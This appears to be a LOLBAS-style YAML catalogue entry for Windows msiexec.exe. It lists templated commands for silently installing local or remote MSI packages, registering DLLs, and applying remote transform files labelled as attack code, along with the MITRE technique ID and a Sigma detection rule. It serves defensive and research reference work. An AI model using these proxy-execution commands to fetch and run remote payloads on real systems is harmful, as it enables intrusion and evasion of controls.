      document_utf8: "---\nName: Msiexec.exe\nDescription: Used by Windows to execute msi files\nAuthor:\
        \ Oddvar Moe\nCreated: 2018-05-25\nCommands:\n  - Command: msiexec /quiet /i {PATH:.msi}\n   \
        \ Description: Installs the target .MSI file silently.\n    Usecase: Execute custom made msi file\
        \ with attack code\n    Category: Execute\n    Privileges: User\n    MitreID: T1218.007\n    OperatingSystem:\
        \ Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11\n    Tags:\n      -\
        \ Execute: MSI\n  - Command: msiexec /q /i {REMOTEURL}\n    Description: Installs the target remote\
        \ & renamed .MSI file silently.\n    Usecase: Execute custom made msi file with attack code from\
        \ remote server\n    Category: Execute\n    Privileges: User\n    MitreID: T1218.007\n    OperatingSystem:\
        \ Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11\n    Tags:\n      -\
        \ Execute: MSI\n      - Execute: Remote\n  - Command: msiexec /y {PATH_ABSOLUTE:.dll}\n    Description:\
        \ Calls DllRegisterServer to register the target DLL.\n    Usecase: Execute dll files\n    Category:\
        \ Execute\n    Privileges: User\n    MitreID: T1218.007\n    OperatingSystem: Windows vista, Windows\
        \ 7, Windows 8, Windows 8.1, Windows 10, Windows 11\n    Tags:\n      - Execute: DLL\n      -\
        \ Execute: Remote\n  - Command: msiexec /z {PATH_ABSOLUTE:.dll}\n    Description: Calls DllUnregisterServer\
        \ to un-register the target DLL.\n    Usecase: Execute dll files\n    Category: Execute\n    Privileges:\
        \ User\n    MitreID: T1218.007\n    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows\
        \ 8.1, Windows 10, Windows 11\n    Tags:\n      - Execute: DLL\n      - Execute: Remote\n  - Command:\
        \ msiexec /i {PATH_ABSOLUTE:.msi} TRANSFORMS=\"{REMOTEURL:.mst}\" /qb\n    Description: Installs\
        \ the target .MSI file from a remote URL, the file can be signed by vendor. Additional to the\
        \ file a transformation file will be used, which can contains malicious code or binaries. The\
        \ /qb will skip user input.\n    Usecase: Install trusted and signed msi file, with additional\
        \ attack code as transformation file, from a remote server\n    Category: Execute\n    Privileges:\
        \ User\n    MitreID: T1218.007\n    OperatingSystem: Windows Vista, Windows 7, Windows 8, Windows\
        \ 8.1, Windows 10, Windows 11\n    Tags:\n      - Execute: MSI\n      - Execute: MST\n      -\
        \ Execute: Remote\nFull_Path:\n  - Path: C:\\Windows\\System32\\msiexec.exe\n  - Path: C:\\Windows\\\
        SysWOW64\\msiexec.exe\nDetection:\n  - Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_msiexec_web_install.yml\n\
